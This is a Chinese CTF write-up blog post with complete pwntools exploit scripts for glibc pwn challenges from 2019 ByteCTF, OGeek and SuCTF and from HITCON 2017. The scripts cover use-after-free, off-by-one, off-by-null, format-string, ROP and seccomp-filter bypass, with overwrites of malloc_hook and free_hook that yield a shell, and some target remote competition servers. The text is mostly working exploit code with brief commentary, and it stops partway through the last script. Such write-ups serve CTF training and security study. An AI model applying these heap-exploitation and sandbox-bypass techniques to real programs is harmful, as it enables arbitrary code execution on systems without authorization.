    <url>%2F2019%2F09%2F14%2F2019ByteCTF_2019OGeek_2019SuCTF%2F</url>
    <content type="text"><![CDATA[前言：唉，好久没写博客了。。。这次又来填坑。。。感觉现在写wp越来越懒得分析，基本能说一句话都不想说第二句。。。这里包含了最近的几场比赛的glibc的题目（没错，咸鱼除了glibc还能做什么呢？呵呵）。。需要的话自取。。。 2019ByteCTF / 2019OGeek / 2019SuCTF 要开始准备拟态防御专题和内核的东西了。。。。队里开始换届。。。。要开始做扛旗的准备。 ByteCTF-mulnote:加了OLLVM混淆的ELF，拿到的时候一脸懵逼，后来发现程序逻辑还是蛮简单的，UAF的洞也很明显。比较坑的一个点是最后的时候要等所有的线程结束再触发__malloc_hook，所以最后要等个10秒钟，不然肯定会错。原因大概是线程结束时，主线程已经拿了shell，可能在结束处理时栈会有问题从而报错。 exp如下：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283#coding:utf-8from pwn import *path = './mulnote'debug = 1attach = 0#P = ELF(path)context(os='linux',arch='amd64',terminal=['terminator','-x','sh','-c'])context.log_level = 'debug'if debug == 1: p = process(path) if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6')else: p = remote()def new(size,content): p.recvuntil('&gt;') p.sendline('C') p.recvuntil('size&gt;') p.sendline(str(size)) p.recvuntil('note&gt;') p.send(content)def edit(index,content): p.recvuntil('&gt;') p.sendline('E') p.recvuntil('index&gt;') p.sendline(str(index)) p.recvuntil('note&gt;') p.send(content)def show(): p.recvuntil('&gt;') p.sendline('S')def delete(index): p.recvuntil('&gt;') p.sendline('R') p.recvuntil('index&gt;') p.sendline(str(index))new(0x80,'\x00'*(0x80-1))#gdb.attach(p)delete(0)sleep(1)show()p.recvuntil('[*]note[0]:\n')libcbase = u64(p.recv(6).ljust(8,'\x00')) - (0x7f45442cdb78-0x7f45442d3000) - (0x4ce000-0x104000)log.success('libcbase = '+hex(libcbase))sleep(9)new(0x60,'\x00'*0x5f) #0new(0x60,'\x11'*0x5f) #1delete(0)sleep(0.5)delete(1)sleep(0.5)delete(0)sleep(0.5)one_gadget = [0x45216,0x4526a,0xf02a4,0xf1147]new(0x60,p64(libcbase+libc.sym['__malloc_hook']-0x23)) new(0x60,'\x11'*0x5f) new(0x60,'\x22'*0x5f) new(0x60,'\x00'*0xb+p64(libcbase+one_gadget[2])+p64(libcbase+libc.sym['realloc'])) sleep(10)p.recvuntil('&gt;')p.sendline('C')p.recvuntil('size&gt;')p.sendline(str(16))#gdb.attach(p)if attach == 1: gdb.attach(p)p.interactive() ByteCTF-mheap:当时比赛时看了半小时，没看出哪有问题，找到一个整数溢出，但是利用不了，出现了链表，大概能猜到是利用溢出伪造一个链表指针，在程序遍历lastptr寻找相同大小size的指针时劫持程序的chunk到got表，从而泄露libc，劫持执行流。 但是却没找到溢出点，在几个输入点都看了半天都没问题。。。最后看了队长的exp，是利用read()返回值检查的漏洞，结合read本身出错时的特性来利用的。。。。是个新姿势。 exp如下：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869from pwn import *def add(p, idx, size, content): p.sendlineafter('Your choice: ', str(1)) p.sendlineafter('Index: ', str(idx)) p.sendlineafter('size: ', str(size)) if size == len(content): p.sendafter('Content: ', content) else: p.sendlineafter('Content: ', content)def show(p, idx): p.sendlineafter('Your choice: ', str(2)) p.sendlineafter('Index: ', str(idx))def delete(p, idx): p.sendlineafter('Your choice: ', str(3)) p.sendlineafter('Index: ', str(idx))def edit(p, idx, content): p.sendlineafter('Your choice: ', str(4)) p.sendlineafter('Index: ', str(idx)) p.send(content)def pwn(): context.log_level = 'debug' context.terminal = ['tmux', 'split', '-h'] DEBUG = 1 libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') elf = ELF('./mheap') if DEBUG: p = process('./mheap') else: p = remote('112.126.98.5', 9999) add(p, 0, 0x1000 - 0x40 - 0x20, 'sunichi') #1 add(p, 1, 0x10, 'sunichi') #2 add(p, 2, 0x10, 'sunichi!'*2) #3 delete(p, 1) #4 delete(p, 2) #5 p.sendlineafter('Your choice: ', str(1)) #6 p.sendlineafter('Index: ', str(15)) p.sendlineafter('size: ', str(0x60)) gdb.attach(p) payload = p64(0x20) + p64(0x4040cb) + p64(0) * 2 + p64(0x70) + p64(0)[:7] + '\n' p.sendafter('Content: ', payload) add(p, 1, 0x10, '/bin/sh\x00') #7 payload = 'a' * 5 + p64(elf.got['puts']) add(p, 14, 0x10, payload) #8 show(p, 0) libc.address = u64(p.recv(6) + '\x00\x00') - libc.symbols['puts'] log.success('libcbase = '+hex(libc.address)) p.sendlineafter('Your choice: ', str(4)) p.sendlineafter('Index: ', str(0)) p.send(p64(libc.address + 0x4f322)) p.sendline('sun') p.interactive()if __name__ == '__main__': pwn() impeccable-Artifact(hitcon-2017-qual)：这道题考的是沙箱过滤器的读取能力，算是入门沙箱过滤的基础题。 exp如下：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374#coding:utf-8from pwn import *path = './artifact'debug = 1attach = 0#P = ELF(path)context(os='linux',arch='amd64',terminal=['terminator','-x','sh','-c'])#context.log_level = 'debug'if debug == 1: p = process(path) if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6')else: p = remote()p.recvuntil('Choice?\n')p.sendline('1')p.recvuntil('Idx?\n')p.sendline(str(0x658/8))p.recvuntil('is: ')libcbase = int(p.recvuntil('\n'),10) - libc.sym['__libc_start_main']-240log.success('libcbase = '+hex(libcbase))p.recvuntil('Choice?\n')p.sendline('1')p.recvuntil('Idx?\n')p.sendline(str(0x650/8))p.recvuntil('is: ')baseaddr = int(p.recvuntil('\n'),10) - 0xbb0log.success('baseaddr = '+hex(baseaddr))p.recvuntil('Choice?\n')p.sendline('1')p.recvuntil('Idx?\n')p.sendline(str(0x668/8))p.recvuntil('is: ')flag_addr = int(p.recvuntil('\n'),10) - 0x100log.success('stack_addr = '+hex(flag_addr))p.recvuntil('Choice?\n')p.sendline('2')p.recvuntil('Idx?\n')p.sendline(str(0x640/8))p.recvuntil('number:\n')p.sendline(str(int('0x67616c66',16)))p_rdx_rsi = libcbase + 0x1150c9p_rdi = libcbase + 0x21102 bss = 0x202a00 + baseaddrrop = [ p_rdx_rsi,2,0,p_rdi,flag_addr+8,libcbase+libc.sym['open'], p_rdx_rsi,0x100,bss,p_rdi,3,libcbase+libc.sym['read'], p_rdx_rsi,0x100,bss,p_rdi,1,libcbase+libc.sym['write'] ]for i in range(18): p.recvuntil('Choice?\n') p.sendline('2') p.recvuntil('Idx?\n') p.sendline(str((0x658+i*8)/8)) p.recvuntil('number:\n') p.sendline(str(rop[i]))p.recvuntil('Choice?\n')p.sendline('3')if attach == 1: gdb.attach(p)p.interactive() ByteCTF-vip:这题开始做的时候很懵逼，become_vip里的溢出完全不知道怎么用。。。并不知道name数组后面的那些变量意味着什么。比赛结束后上网查阅关于沙箱过滤的资料，学到了不少东西。还是有比要记录一下的。hhhhh 这两篇链接讲的不错，安利一下：（后来了解到原来这种过滤规则是tcp协议包的过滤规则格式。。。果然不能被方向遮住了视野。。） 传送门一号 传送门二号 exp如下：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135#coding:utf-8from pwn import *path = './vip'debug = 1attach = 0#P = ELF(path)context(os='linux',arch='amd64',terminal=['tmux','split','-h'])context.log_level = 'debug'if debug == 1: p = process(path) if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6')else: p = remote()def new(index): p.recvuntil('choice: ') p.sendline('1') p.recvuntil('Index: ') p.sendline(str(index))def delete(index): p.recvuntil('choice: ') p.sendline('3') p.recvuntil('Index: ') p.sendline(str(index))def edit(index,size,content): p.recvuntil('choice: ') p.sendline('4') p.recvuntil('Index: ') p.sendline(str(index)) p.recvuntil('Size: ') p.sendline(str(size)) p.recvuntil('Content: ') p.send(content)def show(index): p.recvuntil('choice: ') p.sendline('2') p.recvuntil('Index: ') p.sendline(str(index))def vip(name): p.recvuntil('choice: ') p.sendline('6') p.recvuntil('name: \n') p.send(name)''' line CODE JT JF K================================= 0000: 0x20 0x00 0x00 0x00000004 A = arch 0001: 0x15 0x00 0x08 0xc000003e if (A != ARCH_X86_64) goto 0010 0002: 0x20 0x00 0x00 0x00000000 A = sys_number 0003: 0x35 0x06 0x00 0x40000000 if (A &gt;= 0x40000000) goto 0010 0004: 0x15 0x04 0x00 0x00000001 if (A == write) goto 0009 0005: 0x15 0x03 0x00 0x00000000 if (A == read) goto 0009 0006: 0x15 0x02 0x00 0x00000002 if (A == open) goto 0009 0007: 0x15 0x01 0x00 0x0000003c if (A == exit) goto 0009 0008: 0x06 0x00 0x00 0x00050005 return ERRNO(5) 0009: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0010: 0x06 0x00 0x00 0x00000000 return KILL'''name = '\x00'*0x20name+= p16(0x20)+p8(0)+p8(0)+p32(0) #0:A = sys_numbername+= p16(0x15)+p8(1)+p8(0)+p32(0x101) #1:if (A == openat) goto 0003name+= p16(0x35)+p8(1)+p8(0)+p32(0) #2:if (A &gt;= 0x0) goto 0004name+= p16(0x06)+p8(0)+p8(0)+p32(0x00050000) #3:return ERRNO(0)name+= p16(0x06)+p8(0)+p8(0)+p32(0x7fff0000) #4:return ALLOWvip(name)for i in range(16): new(i)payload = '\x00'*0x58 + p64(0x421)edit(0,0x60,payload)delete(1)new(1)show(1)libcbase = u64(p.recv(6).ljust(8,'\x00')) - (0x7fd4223d9090-0x00007fd421fed000)log.success('libcbase = '+hex(libcbase))payload = '\x00'*0x58 + p64(0x61)edit(1,0x60,payload)delete(1)payload = '\x00'*0x58 + p64(0x61) + p64(0x404100)edit(0,0x68,payload)new(0)new(1)payload = p64(0x404100) + p64(libcbase+libc.sym['environ'])edit(1,0x10,payload)show(1)ret_addr = u64(p.recv(6).ljust(8,'\x00')) - 0xf0 log.success('ret_addr = '+hex(ret_addr))payload = p64(0x404100) + p64(0x404a00)edit(0,0x10,payload)edit(1,4,'flag')p_rdx_rsi = 0x1306d9 + libcbasep_rdi = 0x2155f + libcbasep_rax = 0x439c8 + libcbase syscall = 0xd2975 + libcbasebss = 0x404b00flag_addr = 0x404a00rop = [ p_rdx_rsi,0,0,p_rdi,flag_addr,p_rax,2,syscall, p_rdx_rsi,0x100,bss,p_rdi,3,libcbase+libc.sym['read'], p_rdx_rsi,0x100,bss,p_rdi,1,libcbase+libc.sym['write'] ]for i in range(20): payload = p64(0x404100) + p64(ret_addr+8*i) edit(0,0x10,payload) edit(1,8,p64(rop[i]))p.recvuntil('choice: ')p.sendline('5')if attach == 1: gdb.attach(p)p.interactive() 意外收获：我们平时所用的read，open，write内部都是通过系统调用实现的，他们其实真正的名字叫GI___libc_read，__GI___libc_write，__libc_open64，其内部的系统调用read就为read，write就为write，但是open却不是open，而是openat。open的系统调用号为0，openat的系统调用号是0x101，如下图所示： 所以我们最后rop时，虽然我们禁用了openat的系统调用，但可以直接调用open的系统调用来打开文件进行读写，如果调用open函数来打开文件就会失败。 ByteCTF-note_five:这题算是一道在基础的利用方式上进行了小创新了吧。 先看程序，发现没有show函数，而且new的chunk的size限制了大小，最小可申请0x90，这就把常规的fastbin_attack禁用了，再发现有off-by-one，可以chunkoverlapping。 大致思路为：用off-by-one导致chunkoverlapping，然后unsortedbin_attack攻击global_max_fast到这里可能都比较简单，之后可能就有点点难度了，利用文件结构体里的0xffffffffffffffff的头部0xff来作为chunk的size，然后就需要好几次二次写，最后改malloc_hook。 中间的有一个地方做的时候开始没看清楚耽误了很长时间，就是new的时候会直接把存在的指针给覆盖掉，不需要先清零。。。。 exp如下：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154#coding:utf-8from pwn import *path = './note_five'debug = 1attach = 0#P = ELF(path)context(os='linux',arch='amd64',terminal=['terminator','-x','sh','-c'])context.log_level = 'debug'if debug == 1: p = process(path) if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6')else: p = remote()def new(index,size): p.recvuntil('choice&gt;&gt; ') p.sendline('1') p.recvuntil('idx: ') p.sendline(str(index)) p.recvuntil('size: ') p.sendline(str(size))def delete(index): p.recvuntil('choice&gt;&gt; ') p.sendline('3') p.recvuntil('idx: ') p.sendline(str(index))def edit(index,content): p.recvuntil('choice&gt;&gt; ') p.sendline('2') p.recvuntil('idx: ') p.sendline(str(index)) p.recvuntil('content: ') p.send(content)def pwn(): new(0,0xa8) #0 new(1,0xe8) #1 ---&gt; new(2,0xe8) #2 ---&gt; new(3,0xf8) #3 new(4,0xe8) #4 payload = '\x00'*0xe0 + p64(0x1e0+0xb0) + '\x00' edit(2,payload+'\n') delete(0) payload = '\x00'*0xf8 + '\x71' edit(3,payload) edit(4,'\x00'*0x68+'\x21'+'\n') delete(3) delete(4) new(0,0xa8) new(3,0xe8) #1 3 new(4,0xe8) #2 4 delete(1) payload = p64(0)+'\xe8\xb7' edit(3,payload+'\n') new(1,0xe8) edit(0,'\x00'*0xa8 + '\xa1') edit(1,'\x00'*0x98 + '\x21' + '\n') delete(1) edit(3,'\xf0'+'\n') new(1,0x90) edit(0,'\x00'*0xa8 + '\x71') edit(1,'\x00'*0x68 + '\x21' + '\n') delete(1) delete(2) edit(4,'\xcf\xa5'+'\n') new(2,0xe8) payload = '\x00'*(0x41-8) + p64(0xf1) + p64(0xfbad1800) + p64(0)*3 + '\x00' new(1,0xe8) edit(1,payload+'\n') p.recv(0x40) libcbase = u64(p.recv(6).ljust(8,'\x00')) - (0x7f64c496a600-0x00007f64c45a5000) log.success('libcbase = '+hex(libcbase)) delete(2) edit(4,p64(libcbase+(0x7f2b014f996f-0x7f2b01135000))+'\n') new(2,0xe8) new(1,0xe8) payload = '\x00' + p64(libcbase+0x7f4a55bf99c0-0x7f4a55835000) + '\x00'*0x30 payload+= p64(libcbase+0x7f4a55bf86e0-0x7f4a55835000) + '\x00'*0x10 + p64(0)*17+p64(0xff) edit(1,payload+'\n') delete(2) edit(4,p64(libcbase+(0x7fdfd6589a50-0x7fdfd61c5000))+'\n') new(2,0xe8) new(1,0xe8) one_gadget = [0x45216,0x4526a,0xf1147,0xf02a4] payload = p64(0)*18 payload+= p64(libcbase+0x7fdfd6588260-0x7fdfd61c5000) + p64(0) payload+= p64(libcbase+0x7fdfd624ae20-0x7fdfd61c5000) + p64(libcbase+0x7fdfd624aa00-0x7fdfd61c5000) payload+= p64(libcbase+one_gadget[3]) edit(1,payload+'\n') delete(1) ''' delete(2) fd = libcbase + (0x7f71b971a610-0x7f71b9355000) edit(4,p64(fd)+'\n') edit(0,'\x00'*0xe8 + '\x61') edit(3,'\x00'*0x58 + '\x21'+'\n') delete(3) new(2,0xe8) new(3,0xe8) one_gadget = [0x45216,0x4526a,0xf02a4,0xf1147] fake_file = p64(0xfbad2887) + p64(libcbase+libc.sym['_IO_2_1_stdout_']+0x83) fake_file+= p64(libcbase+libc.sym['_IO_2_1_stdout_']+0x83) + p64(libcbase+libc.sym['_IO_2_1_stdout_']+0x83) fake_file+= p64(libcbase+libc.sym['_IO_2_1_stdout_']+0x83) + p64(libcbase+libc.sym['_IO_2_1_stdout_']+0x83) fake_file+= p64(libcbase+libc.sym['_IO_2_1_stdout_']+0x83) + p64(libcbase+libc.sym['_IO_2_1_stdout_']+0x83) fake_file+= p64(libcbase+libc.sym['_IO_2_1_stdout_']+0x84) + p64(0) fake_file+= p64(0) + p64(0) fake_file+= p64(0) + p64(libcbase+libc.sym['_IO_2_1_stdin_']) fake_file+= p64(1) + p64(0xffffffffffffffff) fake_file+= p64(0x000000000b000000) + p64(libcbase+(0x7f9ec759b780-0x7f9ec71d5000)) # fake_file+= p64(0xffffffffffffffff) + p64(0) fake_file+= p64(libcbase+( 0x7f95d53c97a0-0x00007f95d5005000)) + p64(0) fake_file+= p64(0) + p64(0) fake_file+= p64(0xffffffff) + p64(0) fake_file+= p64(0) + p64(libcbase+libc.sym['_IO_2_1_stdout_']+0xd8-0x30) edit(3,fake_file+'\n') ''' if attach == 1: gdb.attach(p) p.interactive()while True: try: pwn() break except: p.close() p = process('./note_five') 意外收获： 上图这种堆的排布方式还是蛮好用的，特别是在off-by-one时： 12345678910111213new(1,0x98)new(2,0x98)new(3,0x98)#这里还要申请一个chunk来隔开topchunk，我没写delete(1)payload = '\x00'*0x90 + p64(0x140) + '\xa0'edit(2,payload)delete(3) #合并new(4,0xe8)new(5,0xe8)#这时候就可以用chunk2来控制chunk5了delete(5)edit(2,'\x00'*0x40 + p64(prevsize_chunk5) + p64(size_chunk5) + ..........) 如果是off-by-null的话，我们可以参考如下结构，（这是开启了mallocp(0) 的）： 123456789101112131415161718192021222324252627add(0x78) #0add(0x78) #1add(0x78) #2add(0x78) #3add(0x78) #4add(0x78) #5add(0x78) #6add(0x78) #7delete(3) delete(4)delete(5)payload = '\x00' * 0x78edit(2, payload)add(0x78) #3add(0x78) #4delete(3)delete(6)add(0x78) #3add(0x78) #5 4 &lt;==&gt; 5add(0x78) #6 SUCTF-二手破电脑：漏洞点在于scanf(&quot;%s&quot;)时会在结尾处加一个\x00，造成off-by-null，可以chunkoverlapping，然后使name_ptr指向自己，然后在rename里就可以改name_ptr为free_hook，然后改free_hook为system的地址。 堆块构造可能有些复杂，需要先提前做好规划。 exp如下：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136#coding:utf-8from pwn import *path = './pwn'debug = 1attach = 0#P = ELF(path)context(os='linux',arch='i386',terminal=['terminator','-x','sh','-c'])#context.log_level = 'debug'if debug == 1: p = process(path) if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6')else: p = remote()def new(size,content): p.recvuntil('&gt;&gt;&gt; ') p.sendline('1') p.recvuntil(' length: ') p.sendline(str(size)) p.recvuntil('Name: ') p.sendline(content) p.recvuntil('Price: ') p.sendline('66')def comment(index,content): p.recvuntil('&gt;&gt;&gt; ') p.sendline('2') p.recvuntil('Index: ') p.sendline(str(index)) p.recvuntil(': ') p.send(content) p.recvuntil(': ') p.sendline('66')def delete(index): p.recvuntil('&gt;&gt;&gt; ') p.sendline('3') p.recvuntil('index: ') p.sendline(str(index))def rename(index,new_content_1,new_content,isGetPower='y',serial='e4SyD1C!'): p.recvuntil('&gt;&gt;&gt; ') p.sendline('4') p.recvuntil('index: ') p.sendline(str(index)) p.send(new_content_1) p.recvuntil('Wanna get more power?(y/n)') p.sendline(isGetPower) if isGetPower == 'y': p.recvuntil('Give me serial: ') p.send(serial) raw_input() p.send('\n') p.recvuntil('Hey Pwner') p.send(new_content)new(0x18,'\x00'*0x10) #0comment(0,'\x00'*0x10)new(0x18,'\x00'*0x10) #1delete(0)new(0x18,'\x11'*4)comment(0,'\x11'*4)delete(0)p.recvuntil('\x11'*4)libcbase = u32(p.recv(4)) - (0xf7ebd7b0-0xf7d0b000)log.success('libcbase = '+hex(libcbase))comment(1,'\x00'*0x10)new(0x18,'\x00'*0x10) #0new(0x18,'\x00'*0x10) #2 new(0x18,'\x00'*0x10) #3new(0x18,'\x00'*0x10) #4new(0x18,'\x00'*0x10) #5new(0x18,'\x00'*0x10) #6comment(0,'\x00'*0x10)comment(2,'\x00'*0x10)comment(3,'\x00'*0x10)comment(4,'\x00'*0x10)comment(5,'\x00'*0x10)comment(6,'\x00'*0x10)new(0x18,'\x00'*0x10) #7delete(0)for i in range(5): delete(i+2)comment(7,'\x77'*0x8)delete(7)p.recvuntil('\x77'*8)heapbase = u32(p.recv(4)) - 0x248log.success('heapbase = '+hex(heapbase))new(0x78,'\x00') #0new(0x78,'\x00') #2new(0x78,'\x00') #3new(0x78,'\x00') #4new(0x78,'\x00') #5new(0x68,'\x00') #6new(0x68,'\x00') #7delete(0)delete(2)delete(3)delete(4)new(0x7c,'\x11'*0x7c) #0new(0x5c,'\x22'*0x58+'\x60') #2new(0x8,'\x33'*8) #3new(0x8,'\x44'*8) #4new(0x60,'\x99'*0x60) #9delete(2)delete(5)new(0x68,'/bin/sh\x00'+'\x22'*0x60) #2payload = p32(0)*3 + p32(0x29) + p32(0) + p32(heapbase+0x350) + '\x00'*0x18 + p32(0) + p32(0x29)new(0x88,payload) #5rename(8,p32(libcbase+libc.sym['__free_hook'])*2,p32(libcbase+libc.sym['system']))if attach == 1: gdb.attach(p)p.interactive() SUCTF-playfmt:程序在最开始会把flag放进堆里，然后我们用格式化字符串把他读出来就行了，常规的bss段的格式化字符串。 exp如下：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263#coding:utf-8from pwn import *path = './playfmt'debug = 0attach = 0#P = ELF(path)context(os='linux',arch='i386',terminal=['terminator','-x','sh','-c'])context.log_level = 'debug'if debug == 1: p = process(path) if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6')else: p = remote('120.78.192.35',9999)p.recvuntil('=====================\n')p.recvuntil('=====================\n')p.send('%18$p')heapbase = int(p.recv(10),16) - (0x86bea28-0x086ba000)log.success('heapbase = '+hex(heapbase))sleep(0.5)#gdb.attach(p,'b *0x0804889f')p.send('%6$p')stack = int(p.recv(10),16)log.success('stack = '+hex(stack))sleep(0.5)#gdb.attach(p,'b *0x0804889f')one_str = str(hex(stack+2))[-4:]one_str = int(one_str,16)log.success('one_str = '+hex(one_str))p.send('%'+str(one_str)+'c%6$hn'+'\x00')p.recv()sleep(0.5)#gdb.attach(p,'b *0x0804889f')two_str = '0'+str(hex(heapbase+0x4a10))[-7:-4]two_str = int(two_str,16)log.success('two_str = '+hex(two_str))p.send('%'+str(two_str)+'c%14$hn'+'\x00')p.recv()sleep(0.5)#gdb.attach(p,'b *0x0804889f')three_str = str(hex(heapbase+0x4a10))[-4:]three_str = int(three_str,16)log.success('three_str = '+hex(three_str))p.send('%'+str(three_str)+'c%6$hn'+'\x00')p.recv()sleep(0.5)p.send('%14$s'+'\x00')if attach == 1: gdb.attach(p,'b *0x0804889f')p.interactive() OGeek-hub:反向溢出漏洞，2.27环境，导致了doublefree，需要注意一些细节，其他没什么。 exp如下：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116#coding:utf-8from pwn import *path = './hub'debug = 1attach = 0#P = ELF(path)context(os='linux',arch='amd64',timeout = 0.5)#,terminal=['terminator','-x','sh','-c'])context.terminal = ['tmux','splitw','-h']#context.log_level = 'debug'if debug == 1: p = process(path) if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6')else: p = remote('47.112.139.218',13132) libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')def new(size): p.recvuntil('&gt;&gt;') p.sendline('1') p.recvuntil('stay?\n') p.sendline(str(size))def delete(offset): p.recvuntil('&gt;&gt;') p.sendline('2') p.recvuntil('want?\n') p.sendline(offset)def upgrade(payload): p.recvuntil('&gt;&gt;') p.sendline('3') p.recvuntil('want?\n') p.send(payload)def pwn(): new(0x40) new(0xa0) new(0x90) new(0x20) delete('-'+str(0xa0)) delete('-'+str(0xa0)) delete('-'+str(0xa0+0xa0+0x10)) delete('-'+str(0xa0+0xa0+0x10)) delete('-'+str(0xa0+0xa0+0x10+0x40+0x10)) delete('-'+str(0xa0+0xa0+0x10+0x40+0x10)) new(0x90) new(0x90) new(0x90) delete('0') new(0x30) upgrade('\x60\x27') new(0x90) new(0x90) upgrade(p64(0xfbad1800)) new(0x50) new(0xa0) new(0xa0) new(0xa0) delete('0') new(0x30) upgrade('\x80\x27') new(0xa0) new(0xa0) upgrade('\x00') p.recvuntil('\x00'*8) libcbase = u64(p.recv(6).ljust(8,'\x00')) - (0x7f1995c238b0-0x7f1995836000) log.success('libcbase = '+hex(libcbase)) new(0x40) upgrade(p64(libcbase+libc.sym['__free_hook'])) new(0x40) new(0x40) upgrade(p64(libcbase+libc.sym['system'])) new(0x60) upgrade('/bin/sh\x00') delete('0') if attach == 1: gdb.attach(p) p.interactive()while True: try: pwn() break except: p.close() if debug == 1: p = process(path) if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6') else: p = remote('47.112.139.218',13132) libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') OGeek-babyrop:利用溢出使strncmp()的第三个参数为0来绕过随机数检查，之后进行rop即可，第二次回来时可能需要调试找偏移。 exp如下：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152#coding:utf-8from pwn import *path = './babyrop'debug = 0attach = 0#P = ELF(path)context(os='linux',arch='i386',terminal=['terminator','-x','sh','-c'])context.log_level = 'debug'if debug == 1: p = process(path) if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6')else: p = remote('47.112.137.238',13337) libc = ELF('./libc-2.23.so')P = ELF('./babyrop')main = 0x080487d0bss = 0x0804aa00#gdb.attach(p)p.send('\x00'*7+'\xff'+'\x00')p.recvuntil('Correct\n')payload = '\x11'*0xe7 payload+= p32(0xdeadbeef)payload+= p32(P.plt['write'])payload+= p32(main)payload+= p32(1)payload+= p32(P.got['write'])payload+= p32(4)p.send(payload)libcbase = u32(p.recv(4)) - libc.sym['write']log.success('libcbase = '+hex(libcbase))payload = '\x22'*231payload+= p32(0xdeadbeef)payload+= p32(libcbase+libc.sym['system'])payload+= p32(0xdeadbeef)payload+= p32(libcbase+libc.search('/bin/sh\x00').next())p.send(payload)if attach == 1: gdb.attach(p)p.interactive() OGeek-Bookmanager:程序漏洞百出，溢出，off-by-one，uaf。。。。。只要逻辑看懂，做出来只是时间问题，chunk的构造也不复杂。算是一道水题吧。。。 exp如下：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107#coding:utf-8from pwn import *path = './bookmanager'debug = 1attach = 1#P = ELF(path)context(os='linux',arch='amd64',terminal=['terminator','-x','sh','-c'])#context.log_level = 'debug'if debug == 1: p = process(path) if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6')else: p = remote('47.112.115.30',13337) libc = ELF('./libc-2.23.so')def new_chapter(name): p.recvuntil('choice:') p.sendline('1') p.recvuntil('name:') p.sendline(name)def new_section(chapter_name,section_name): p.recvuntil('choice:') p.sendline('2') p.recvuntil('into:') p.sendline(chapter_name) p.recvuntil('name:') p.sendline(section_name)def new_text(section_name,size,content): p.recvuntil('choice:') p.sendline('3') p.recvuntil('into:') p.sendline(section_name) p.recvuntil('write:') p.sendline(str(size)) p.recvuntil('Text:') p.send(content)def delete_text(section_name): p.recvuntil('choice:') p.sendline('6') p.recvuntil('name:') p.sendline(section_name)def delete_section(section_name): p.recvuntil('choice:') p.sendline('5') p.recvuntil('name:') p.sendline(section_name)def delete_chapter(chapter_name): p.recvuntil('choice:') p.sendline('4') p.recvuntil('name:') p.sendline(chapter_name)def show(): p.recvuntil('choice:') p.sendline('7')def update(section_name,content): p.recvuntil('choice:') p.sendline('8') p.recvuntil('Text):') p.sendline('Text') p.recvuntil('name:') p.sendline(section_name) p.recvuntil('New Text:') p.send(content)p.recvuntil('Name of the book you want to create: ')p.sendline('xiaoxiaorenwu')new_chapter('0')new_section('0','/bin/sh\x00')new_text('/bin/sh\x00',0x80,'\x11'*7+'\n')new_section('0','01')delete_text('/bin/sh\x00')new_text('01',0x80,'\x00')show()p.recvuntil('Text:')p.recvuntil('Text:')libcbase = u64(p.recv(6).ljust(8,'\x00')) - (0x7f707708db78-0x7f7076cc9000)log.success('libcbase = '+hex(libcbase))payload = p64(0)*0x10 + p64(0x90) + p64(0x41) + p64(0x3130) + p64(0)*3 + p64(libcbase+libc.sym['__free_hook'])update('01',payload)update('01',p64(libcbase+libc.sym['system']))delete_section('/bin/sh\x00')if attach == 0: gdb.attach(p)p.interactive() OGeek-0 day manage:逻辑比较复杂，猜测是handle里的逻辑漏洞，当num等于0时，可产生uaf，进行leak和修改malloc_hook。 exp如下：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123#coding:utf-8from pwn import *path = '0day_manage'debug = 1attach = 0#P = ELF(path)context(os='linux',arch='amd64',terminal=['tmux','split','-h'])#context.log_level = 'debug'if debug == 1: p = process(path) if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6')else: p = remote()def new_L(data_size,data,note_size,note): p.recvuntil(' 0day\n') p.sendline('1') p.recvuntil('bug\n') p.sendline('1') p.recvuntil('size :') p.sendline(str(data_size)) p.recvuntil('data :') p.send(data) p.recvuntil('size :') 